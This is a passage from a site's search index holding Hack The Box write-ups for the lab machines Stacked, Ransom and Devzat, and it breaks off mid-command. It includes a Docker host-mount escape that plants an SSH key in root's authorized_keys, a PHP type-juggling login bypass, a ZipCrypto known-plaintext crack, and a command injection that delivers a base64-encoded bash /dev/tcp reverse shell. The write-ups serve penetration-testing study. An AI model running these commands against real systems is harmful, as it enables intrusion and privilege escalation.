ld-musl-x86_64.so.1 . ---\u0026gt; 6f7cf378f889 Successfully built 6f7cf378f889 Successfully tagged pwn:latest  We can verify that it is actually created:\nbash-5.0# mydocker images REPOSITORY TAG IMAGE ID CREATED SIZE pwn latest 6f7cf378f889 About a minute ago 2.28MB localstack/localstack-full 0.12.6 7085b5de9f7c 7 months ago 888MB localstack/localstack-full \u0026lt;none\u0026gt; 0601ea177088 13 months ago 882MB lambci/lambda nodejs12.x 22a4ada8399c 13 months ago 390MB lambci/lambda nodejs10.x db93be728e7b 13 months ago 385MB lambci/lambda nodejs8.10 5754fee26e6e 13 months ago 813MB  And then we can run a container using this image specifying that / from the host machine is mounted inside /mnt in the Docker container:\nbash-5.0# mydocker run --rm -v /:/mnt -it pwn /bin/sh /lib # cat /mnt/etc/hostname stacked  As it can be seen, /mnt/etc/hostname shows stacked, so we are reading files from the host machine. Hence, let\u0026rsquo;s add the public SSH key into /mnt/root/.ssh/authorized_keys (that is /root/.ssh/authorized_keys in the host file system):\n/lib # echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=' \u0026gt; /mnt/root/.ssh/authorized_keys /lib # cat /mnt/root/.ssh/authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=  Finally, we are able to login as root in the machine using SSH:\n$ ssh -i id_rsa root@10.10.11.112 root@stacked:~# cat root.txt bd97095c84e01bc86ec04f08be824f38  ","image":"/images/HTB/Stacked/Stacked.png","permalink":"https://7rocky.github.io/en/htb/stacked/","section":"htb","summary":"Hack The Box. Linux. Insane machine. This machine contains a LocalStack environment that is vulnerable to CSRF and command injection. By discovering an XSS vulnerability in a subdomain, we can use CSRF to exploit the command injection vulnerability and get RCE inside a container. After escalating privileges inside the container by restarting a service and entering a malicious command, we can interact with Docker from the host machine and create a malicious container from scratch that mounts the host file system into the container to get arbitrary file read and write. Web exploitation techniques and deep Docker knowledge is needed in order to compromise this machine","time":17,"title":"Stacked"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.153   Release: 15 / 03 / 2022   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.153 -p 22,80 Nmap scan report for 10.10.11.153 Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-title: Admin - HTML5 Admin Template |_Requested resource was http://10.10.11.153/login |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.77 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nWeb enumeration If we go to http://10.10.11.153, we will be redirected to /login, which shows a login form:\nThe website is built with Laravel, which is a PHP web framework. Notice that there is a cookie called laravel_session:\n$ curl -I 10.10.11.153 HTTP/1.1 302 Found Date: Server: Apache/2.4.41 (Ubuntu) Cache-Control: no-cache, private Location: http://10.10.11.153/login Set-Cookie: XSRF-TOKEN=eyJpdiI6IjNLelg0R3cvaTAzRUJURkdjSkswNnc9PSIsInZhbHVlIjoiWGpqQ3oxME1CbXZ5dmFnOCt1SUtST3NMS1RTUUQxL0xZNncxYk9hbXBucHh3elV3OXBiN08wQkpteTV WRGR5SFBjNjBSN2pFODFHRDA1Rkt6ZE1NeklWcjJwZHJOTVFmNmFuTCtUTjBodnMrU29adWJZelFsd2VxVmJGRzdobFgiLCJtYWMiOiJhYWExNWI0MzRlNzk3MzRmYTE0YjdmMzQ5OGE4ZDI3ODFiODJlMWNlM TJmNTk0Y2JlOGM0ODk5NDczMjYxYTFjIiwidGFnIjoiIn0%3D Set-Cookie: laravel_session=eyJpdiI6InIwUm5hV3lrUS83cHAxMG5iMWxkREE9PSIsInZhbHVlIjoiQkVZR2pjd2FUc3Z6ZklETEU3dmpzRjI3N3EzTitMWnFXbXpYN3cwMnpGejBxeVRjVlJKMk9Udk VkcjIxTmVyNm9ZbFFKMitIbVB6Tm1WZW02WUVRNEVnbkU0VEU4ei8ySUdJQW5OdVdlbFE2cnI3MStXcU9ySkExRDl1Z29waTMiLCJtYWMiOiJjOWMyOWJkOWJkYzVjMjM1Y2IyZDZlMDJiYTUyODVmNmE1ZjEy MTcyZjY4NjM5YmUxYzdhMTkzY2Y0ZjY1NmI0IiwidGFnIjoiIn0%3D Content-Type: text/html; charset=UTF-8  We can try to use SQLi in the login form, but it is not vulnerable.\nExploiting Type Juggling Since it is handled with PHP, we can try a vulnerability known as Type Juggling. This is a simple proof of concept:\n$ php -a Interactive shell php \u0026gt; if (\"asdf\" == true) { echo \"true\"; } true  The vulnerability is the use of ==, which does not check the variable type, only the value. A compliant solution would be this one, using ===:\nphp \u0026gt; if (\"asdf\" === true) { echo \"true\"; } else { echo \"false\"; } false  If the website is vulnerable to Type Juggling, if we enter a boolean type as password, we will bypass authentication. Let\u0026rsquo;s use Burp Suite (Repeater):\nWe cannot simply use password=true since the server will parse it as \u0026quot;true\u0026quot; (a string value). In order to add a boolean value, we can use a JSON document. Although the request is using GET, we can add the parameter in the request body as follows:\nAs it is shown, we get \u0026ldquo;Login Successful\u0026rdquo;, so we bypassed authentication. Using the Burp Suite (Proxy), we can intercept the request and modify it before it goes to the server, so that the response is successful.\nThen, we have this portal:\nAt this point, we have user.txt:\nKnown plaintext attack on a encrypted ZIP file There is also a ZIP archive called uploaded-file-3422.zip and it is password-protected:\n$ file uploaded-file-3422.zip uploaded-file-3422.zip: Zip archive data, at least v2.0 to extract, compression method=deflate  We can try to perform a brute force attack using fcrackzip, but the password seems to be strong and we can\u0026rsquo;t find it inside rockyou.txt.\nWe can see the files inside and the compression method:\n$ unzip -v uploaded-file-3422.zip Archive: uploaded-file-3422.zip Length Method Size Cmpr Date Time CRC-32 Name -------- ------ ------- ---- ---------- ----- -------- ---- 220 Defl:N 158 28% 2020-02-25 06:03 6ce3189b .bash_logout 3771 Defl:N 1740 54% 2020-02-25 06:03 ab254644 .bashrc 807 Defl:N 392 51% 2020-02-25 06:03 d1b22a87 .profile 0 Stored 0 0% 2021-07-02 13:58 00000000 .cache/ 0 Stored 0 0% 2021-07-02 13:58 00000000 .cache/motd.legal-displayed 0 Stored 0 0% 2021-07-02 13:58 00000000 .sudo_as_admin_successful 0 Stored 0 0% 2022-03-07 06:32 00000000 .ssh/ 2610 Defl:N 1978 24% 2022-03-07 06:32 38804579 .ssh/id_rsa 564 Defl:N 463 18% 2022-03-07 06:32 cb143c32 .ssh/authorized_keys 564 Defl:N 463 18% 2022-03-07 06:32 cb143c32 .ssh/id_rsa.pub 2009 Defl:N 569 72% 2022-03-07 06:32 396b04b4 .viminfo -------- ------- --- ------- 10545 5763 45% 11 files $ 7z -slt l uploaded-file-3422.zip | grep -A 14 .bash_logout Path = .bash_logout Folder = - Size = 220 Packed Size = 170 Modified = 2020-02-25 07:03:22 Created = Accessed = Attributes = _ -rw-r--r-- Encrypted = + Comment = CRC = 6CE3189B Method = ZipCrypto Deflate Host OS = Unix Version = 20 Volume Index = 0  It seems like a personal directory of some user. Moreover, the compression method is ZipCrypto Deflate.\nAfter reading How I Cracked CONTI Ransomware Group’s Leaked Source Code ZIP File, we know there exists a known plaintext attack on encrypted ZIP files.\nThe file .bash_logout might be a default one. This is the .bash_logout file I have in my machine (the default one):\n$ cp ~/.bash_logout . $ cat .bash_logout # ~/.bash_logout: executed by bash(1) when login shell exits. # when leaving the console clear the screen to increase privacy if [ \"$SHLVL\" = 1 ]; then [ -x /usr/bin/clear_console ] \u0026\u0026 /usr/bin/clear_console -q fi  We can check that both .bash_logout files are equal using the CRC32 algorithm (used by ZIP files to check errors):\n\u0026gt;\u0026gt;\u0026gt; import zlib \u0026gt;\u0026gt;\u0026gt; bash_logout = open('.bash_logout', 'rb').read() \u0026gt;\u0026gt;\u0026gt; hex(zlib.crc32(bash_logout)) '0x6ce3189b'  In the previous unzip / 7z commands we can see the CRC32 value for .bash_logout, and they match, so we have a known plaintext.\nNow it is time to use bkcrack (known plaintext attack) to store the files from uploaded-file-3422.zip into unlocked.zip. We must provide a file plain.zip containing our .bash_logout:\n$ zip plain.zip .bash_logout adding: .bash_logout (deflated 28%) $ ./bkcrack -C uploaded-file-3422.zip -c .bash_logout -P plain.zip -p .bash_logout bkcrack 1.3.5 - 2022-03-28 [03:34:35] Z reduction using 150 bytes of known plaintext 100.0 % (150 / 150) [03:34:35] Attack on 57097 Z values at index 7 Keys: 7b549874 ebc25ec5 7e465e18 78.5 % (44845 / 57097) [03:38:54] Keys 7b549874 ebc25ec5 7e465e18 $ ./bkcrack -C uploaded-file-3422.zip -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip password bkcrack 1.3.5 - 2022-03-28 [03:42:33] Writing unlocked archive unlocked.zip with password \"password\" 100.0 % (9 / 9) Wrote unlocked archive.  At this point, we can extract the files from unlocked.zip:\n$ unzip -P password unlocked.zip Archive: unlocked.zip inflating: .bash_logout inflating: .bashrc inflating: .profile creating: .cache/ extracting: .cache/motd.legal-displayed extracting: .sudo_as_admin_successful creating: .ssh/ inflating: .ssh/id_rsa inflating: .ssh/authorized_keys inflating: .ssh/id_rsa.pub inflating: .viminfo  Privilege escalation Now we\u0026rsquo;ve got a private SSH key. We can connect as user htb (just because it is a machine from UHC) without password:\n$ chmod 600 id_rsa $ ssh -i id_rsa htb@10.10.11.153 htb@ransom:~$ id uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)  Although we belong to group lxd, we will escalate in the intended way.\nLet\u0026rsquo;s find the Laravel website in order to see how the authentication is handled:\nhtb@ransom:~$ find / -name \\*laravel\\* 2\u0026gt;/dev/null /srv/prod/storage/logs/laravel.log /srv/prod/vendor/laravel /srv/prod/vendor/fruitcake/laravel-cors  Nice, it seems that Laravel source files are inside /srv/prod. Let\u0026rsquo;s look for \u0026quot;password\u0026quot; recursively:\nhtb@ransom:~$ cd /srv/prod htb@ransom:/srv/prod$ grep -nri password . | grep -vE 'js|config|vendor|bootstrap' | grep php | grep password ./resources/views/auth/login.blade.php:15: password: $(\"#password\").val() ./resources/views/auth/login.blade.php:44: \u0026lt;p\u0026gt;Please enter the password provided to you in order to send files to the E Corp Engineers.\u0026lt;/p\u0026gt; ./resources/views/auth/login.blade.php:50: \u0026lt;input type=\"password\" name=\"password\" id=\"password\" class=\"form-control form-control-lg\" /\u0026gt; ./resources/lang/en/validation.php:35: 'current_password' =\u0026gt; 'The password is incorrect.', ./resources/lang/en/validation.php:103: 'password' =\u0026gt; 'The password is incorrect.', ./resources/lang/en/passwords.php:7: | Password Reset Language Lines ./resources/lang/en/passwords.php:11: | that are given by the password broker for a password update attempt ./resources/lang/en/passwords.php:12: | has failed, such as for an invalid token or invalid new password. ./resources/lang/en/passwords.php:16: 'reset' =\u0026gt; 'Your password has been reset!', ./resources/lang/en/passwords.php:17: 'sent' =\u0026gt; 'We have emailed your password reset link!', ./resources/lang/en/passwords.php:19: 'token' =\u0026gt; 'This password reset token is invalid.', ./resources/lang/en/auth.php:17: 'password' =\u0026gt; 'The provided password is incorrect.', ./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:13: password: $(\"#password\").val() ./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:42: \u0026lt;p\u0026gt;Please enter the password provided to you in order to send files to the E Corp Engineers.\u0026lt;/p\u0026gt; ./storage/framework/views/716af88e12f9db05fa041bff2e06875d7f0b09db.php:48: \u0026lt;input type=\"password\" name=\"password\" id=\"password\" class=\"form-control form-control-lg\" /\u0026gt; ./app/Exceptions/Handler.php:25: 'current_password', ./app/Exceptions/Handler.php:26: 'password', ./app/Exceptions/Handler.php:27: 'password_confirmation', ./app/Models/User.php:23: 'password', ./app/Models/User.php:32: 'password', ./app/Models/User.php:46: * Always encrypt the password when it is updated. ./app/Models/User.php:53: $this-\u0026gt;attributes['password'] = bcrypt($value); ./app/Http/Kernel.php:66: 'password.confirm' =\u0026gt; \\Illuminate\\Auth\\Middleware\\RequirePassword::class, ./app/Http/Middleware/TrimStrings.php:15: 'current_password', ./app/Http/Middleware/TrimStrings.php:16: 'password', ./app/Http/Middleware/TrimStrings.php:17: 'password_confirmation', ./app/Http/Controllers/AuthController.php:34: 'password' =\u0026gt; 'required', ./app/Http/Controllers/AuthController.php:37: if ($request-\u0026gt;get('password') == \"UHC-March-Global-PW!\") { ./database/migrations/2014_10_12_100000_create_password_resets_table.php:7:class CreatePasswordResetsTable extends Migration ./database/migrations/2014_10_12_100000_create_password_resets_table.php:16: Schema::create('password_resets', function (Blueprint $table) { ./database/migrations/2014_10_12_100000_create_password_resets_table.php:30: Schema::dropIfExists('password_resets'); ./database/migrations/2014_10_12_000000_create_users_table.php:21: $table-\u0026gt;string('password'); ./database/factories/UserFactory.php:21: 'password' =\u0026gt; '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', // password  We found that app/Http/Controllers/AuthController.php is checking that the password is equal to UHC-March-Global-PW! (using == because it is vulnerable to Type Juggling). This password is set for root:\nhtb@ransom:/srv/prod$ su root Password: root@ransom:/srv/prod# cat /root/root.txt a4d5e9000007b5eabfb8358b2dd9ac1a  ","image":"/images/HTB/Ransom/Ransom.png","permalink":"https://7rocky.github.io/en/htb/ransom/","section":"htb","summary":"Hack The Box. Linux. Medium machine. This machine has a Laravel website with a login form that is vulnerable to Type Juggling. After that we find a encrypted ZIP file and we can perform a known plaintext attack to extract the files. The password expected for the login form is reused for the root user. Basic knowledge about web pentesting on PHP and knowledge about ZIP files is required in order to comprimise this machine","time":7,"title":"Ransom"},{"contents":"  OS: Linux   Difficulty: Medium   IP Address: 10.10.11.118   Release: 16 / 10 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.118 -p 22,80,8000 Nmap scan report for 10.10.11.118 Host is up (0.034s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: devzat - where the devs at 8000/tcp open ssh (protocol 2.0) | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) | fingerprint-strings: | NULL: |_ SSH-2.0-Go Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 37.59 seconds  This machine has ports 22 (SSH), 80 (HTTP) and 8000 (SSH) open.\nEnumeration First, we can read the contents of the website on port 80 (going directly to the IP address redirects to devzat.htb), which is the following:\nThey have developed a chat over SSH. To use it, we just need the next command:\nExploring the SSH chat After some exploration and fuzzing, we discover that there are some chat commands:\n$ ssh -l asdf devzat.htb -p 8000 Welcome to the chat. There are no more users devbot: asdf has joined the chat asdf: /help [SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat [SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere. [SYSTEM] [SYSTEM] Interesting features: [SYSTEM] • Many, many commands. Run /commands. [SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room. [SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines. [SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example. [SYSTEM] • Direct messages! Send a quick DM using =user \u0026lt;msg\u0026gt; or stay in DMs by running /room @user. [SYSTEM] • Timezone support, use /tz Continent/City to set your timezone. [SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang \u0026lt;word\u0026gt; to start new games. [SYSTEM] • Emoji replacements! (like on Slack and Discord) [SYSTEM] [SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php. [SYSTEM] [SYSTEM] Made by Ishan Goel with feature ideas from friends. [SYSTEM] Thanks to Caleb Denio for lending his server! [SYSTEM] [SYSTEM] For a list of commands run [SYSTEM] ┃ /commands asdf: /commands [SYSTEM] Commands [SYSTEM] clear - Clears your terminal [SYSTEM] message - Sends a private message to someone [SYSTEM] users - Gets a list of the active users [SYSTEM] all - Gets a list of all users who has ever connected [SYSTEM] exit - Kicks you out of the chat incase your client was bugged [SYSTEM] bell - Toggles notifications when you get pinged [SYSTEM] room - Changes which room you are currently in [SYSTEM] id - Gets the hashed IP of the user [SYSTEM] commands - Get a list of commands [SYSTEM] nick - Change your display name [SYSTEM] color - Change your display name color [SYSTEM] timezone - Change how you view time [SYSTEM] emojis - Get a list of emojis you can use [SYSTEM] help - Get generic info about the server [SYSTEM] tictactoe - Play tictactoe [SYSTEM] hangman - Play hangman [SYSTEM] shrug - Drops a shrug emoji [SYSTEM] ascii-art - Bob ross with text [SYSTEM] example-code - Hello world!  The chat is using Markdown to format the messages. As a curiosity, we can receive a connection to our machine entering the syntax for an image and pointing to our server:\n![](http://10.10.17.44)  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.118. Ncat: Connection from 10.10.11.118:52632. GET / HTTP/1.1 Host: 10.10.17.44 User-Agent: Go-http-client/1.1 Accept-Encoding: gzip  The only thing we get from this connection is that the SSH chat is built with Go.\nAfter trying some command injection payloads and trying to escape from the SSH chat context, we can assume that the chat is secure and there are no clear vulnerabilities.\nFinding subdomains The main website (devzat.htb) only contains information about the SSH chat. Taking into account that the Apache server is redirecting to devzat.htb (as a virtual host), maybe there are more virtual hosts. We can look for new subdomains using ffuf applied to the Host HTTP header:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.118 -H 'Host: FUZZ.devzat.htb' -fc 302 pets [Status: 200, Size: 510, Words: 20, Lines: 21]  And then, we get that pets.devzat.htb is a valid subdomain:\nHere we can find a list of animals with their name, their species and a description of the corresponding species. There is an option to add a new animal using the following form:\nFoothold The POST request is done by JavaScript (Svelte) behind the scenes (using AJAX). Looking at the request with the browser developer tools, we can craft the same request in curl:\n$ curl pets.devzat.htb/api/pet -d '{\"name\":\"asdf\",\"species\":\"cat\"}' Pet was added successfully  Exploiting a command injection Here there is no much more to do. We can try to inject commands in both fields (name and species), and finally we get that species is vulnerable:\n$ curl pets.devzat.htb/api/pet -d '{\"name\":\"asdf\",\"species\":\"`curl 10.10.17.44`\"}' Pet was added successfully  $ nc -nlvp 80 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::80 Ncat: Listening on 0.0.0.0:80 Ncat: Connection from 10.10.11.118. Ncat: Connection from 10.10.11.118:58916. GET / HTTP/1.1 Host: 10.10.17.44 User-Agent: curl/7.68.0 Accept: */*  Hence, we can use the command injection to get Remote Code Execution (RCE) and get foothold on the machine (using nc):\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  $ curl pets.devzat.htb/api/pet -d '{\"name\":\"asdf\",\"species\":\"`echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash`\"}'  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.118. Ncat: Connection from 10.10.11.118:53090. bash: cannot set terminal process group (931): Inappropriate ioctl for device bash: no job control in this shell patrick@devzat:~/pets$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null patrick@devzat:~/pets$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm patrick@devzat:~/pets$ export TERM=xterm patrick@devzat:~/pets$ export SHELL=bash patrick@devzat:~/pets$ stty rows 50 columns 158  System enumeration We have entered to the machine as user patrick:\npatrick@devzat:~/pets$ ls /home catherine patrick  There is another user called catherine.\nWe can list open ports using netstat (it will also show internal ports that are not reported by nmap):\npatrick@devzat:~/pets$ netstat -nat | grep LISTEN tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8086 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN tcp6 0 0 :::8000 :::* LISTEN  Another option is to read from /proc/net/tcp and translate the port numbers from hexadecimal to decimal using some shell scripting:\npatrick@devzat:~/pets$ for p in $(cat /proc/net/tcp | grep -v sl | awk '{print $2}' | awk -F : '{print $2}' | sort -u); do echo \"ibase=16; $p\" | bc; done 22 53 5000 8086 8443 42582 51994 55686  We find that ports 8086 and 8443 are open but not exposed, because nmap did not report them as open.\nListing processes that are running, we discover a Docker container that exposes port 8086 and hosts InfluxDB:\npatrick@devzat:~/pets$ ps -faux | grep root ... root 997 0.0 0.2 8880 4740 ? Ss 08:37 0:01 /usr/sbin/apache2 -k start root 1020 0.0 4.5 946772 91900 ? Ssl 08:37 0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock root 1238 0.0 0.1 475324 3880 ? Sl 08:37 0:00 \\_ /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8086 -container-ip 172.17.0.2 -container-port 8086 root 1271 0.0 0.3 113372 7940 ? Sl 08:37 0:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 0962e39dbfea62142f5f9e796a0fa5bd6df0c14a31f3786e03b720ea158cf462 -address /run/containerd/containerd.sock root 1296 0.1 2.8 554212 57816 ? Ssl 08:37 0:29 \\_ influxd root 9672 0.0 0.4 249544 9628 ? Ssl 09:14 0:00 /usr/lib/upower/upowerd  On the other hand, we can find ZIP files owned by catherine, and we have no permissions over those files:\npatrick@devzat:~/pets$ find / -user catherine 2\u0026gt;/dev/null | grep -v home | xargs ls -l -rw------- 1 catherine catherine 28297 Jul 16 2021 /var/backups/devzat-dev.zip -rw------- 1 catherine catherine 27567 Jul 16 2021 /var/backups/devzat-main.zip  Lateral movement to user catherine Moreover, we can search recursively for the string catherine in patrick\u0026rsquo;s files, and obtain an interesting Go script:\npatrick@devzat:~/pets$ cd patrick@devzat:~$ grep -nri catherine . Binary file ./devzat/devchat matches ./devzat/devchat.go:273: for possibleName == \"patrick\" || possibleName == \"admin\" || possibleName == \"catherine\" { ./devzat/devchat.go:302: } else if strings.ToLower(u.name) == \"catherine\" { ./devzat/devchat.go:303: u.writeln(\"patrick\", \"Hey Catherine, glad you came.\") ./devzat/devchat.go:304: u.writeln(\"catherine\", \"Hey bud, what are you up to?\") ./devzat/devchat.go:306: u.writeln(\"catherine\", \"Sure\") ./devzat/devchat.go:308: u.writeln(\"catherine\", \"Kinda busy right now :necktie:\") ./devzat/devchat.go:310: u.writeln(\"catherine\", \"k\") ./devzat/devchat.go:312: u.writeln(\"catherine\", \"Fine. As soon as the boss let me off the leash I will check it out.\") Binary file ./.cache/go-build/f1/f10fd574fd735d6eff3807c126e13ddbd8a5968e6c6c9f77c7f0026c370c81df-d matches Binary file ./.cache/go-build/70/70092305916ce0b492b14dafb1c95707ce96d17aaadf07c619cb526bf1b24b7f-d matches Binary file ./pets/petshop matches ./pets/go.mod:1:module git.devzat.htb/catherine/petshop  The script devchat.go contains some old messages (maybe as a reminder) from users admin, patrick and catherine (using the SSH chat):\n// ... if strings.ToLower(u.name) == \"patrick\" { u.writeln(\"admin\", \"Hey patrick, you there?\") u.writeln(\"patrick\", \"Sure, shoot boss!\") u.writeln(\"admin\", \"So I setup the influxdb for you as we discussed earlier in business meeting.\") u.writeln(\"patrick\", \"Cool :thumbs_up:\") u.writeln(\"admin\", \"Be sure to check it out and see if it works for you, will ya?\") u.writeln(\"patrick\", \"Yes, sure. Am on it!\") u.writeln(\"devbot\", \"admin has left the chat\") } else if strings.ToLower(u.name) == \"admin\" { u.writeln(\"admin\", \"Hey patrick, you there?\") u.writeln(\"patrick\", \"Sure, shoot boss!\") u.writeln(\"admin\", \"So I setup the influxdb for you as we discussed earlier in business meeting.\") u.writeln(\"patrick\", \"Cool :thumbs_up:\") u.writeln(\"admin\", \"Be sure to check it out and see if it works for you, will ya?\") u.writeln(\"patrick\", \"Yes, sure. Am on it!\") } else if strings.ToLower(u.name) == \"catherine\" { u.writeln(\"patrick\", \"Hey Catherine, glad you came.\") u.writeln(\"catherine\", \"Hey bud, what are you up to?\") u.writeln(\"patrick\", \"Remember the cool new feature we talked about the other day?\") u.writeln(\"catherine\", \"Sure\") u.writeln(\"patrick\", \"I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.\") u.writeln(\"catherine\", \"Kinda busy right now :necktie:\") u.writeln(\"patrick\", \"That's perfectly fine :thumbs_up: You'll need a password I gave you last time.\") u.writeln(\"catherine\", \"Ok\") u.writeln(\"patrick\", \"I left the source for your review in backups.\") u.writeln(\"catherine\", \"Fine. As soon as the boss let me off the leash I will check it out.\") u.writeln(\"patrick\", \"Cool. I am very curious what you think of it. See ya!\") u.writeln(\"devbot\", \"patrick has left the chat\") } // ...  Now we can confirm that the next steps are messing around with InfluxDB to find something that allows us to login as catherine and then decompress the ZIP files.\nCVE for InfluxDB InfluxDB is a database written in Go that exposes an HTTP API on port 8086 (by default). According to the official documentation, we can interact with InfluxDB using the command line interface influx or directly with curl.\nLet\u0026rsquo;s try using influx. For that, we need to transfer the influx binary to the machine:\npatrick@devzat:~$ cd /tmp patrick@devzat:/tmp$ curl 10.10.17.44/influx -so influ patrick@devzat:/tmp$ chmod +x influx patrick@devzat:/tmp$ alias influx=/tmp/influx  We have used an alias to use influx as a system command. However, influx is not working. It seems that it does not recognizes the InfluxDB instance, or maybe there is some issue with authentication:\npatrick@devzat:/tmp$ influx version Influx CLI 2.0.9 (git: d1233b7951) build_date: 2021-10-01T21:09:53Z patrick@devzat:/tmp$ influx ping Error: Got 404 from 'http://localhost:8086/health'. Error: 404 page not found. See 'influx ping -h' for help patrick@devzat:~$ influx query Error: Must specify org-id, or org name. Error: 404 page not found. See 'influx query -h' for help patrick@devzat:~$ influx setup -o asdf -t 1234 Error: failed to determine if instance has been configured: 404 page not found See 'influx setup -h' for help  After that, we can try with curl, using the local IP address or the Docker container IP address, but again it does not work:\npatrick@devzat:~$ curl http://localhost:8086 404 page not found patrick@devzat:~$ curl http://localhost:8086/ 404 page not found patrick@devzat:~$ curl http://localhost:8086/api/v2/setup 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v2/setup 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v1/setup 404 page not found patrick@devzat:~$ curl http://172.17.0.2:8086/api/v1 404 page not found patrick@devzat:~$ curl 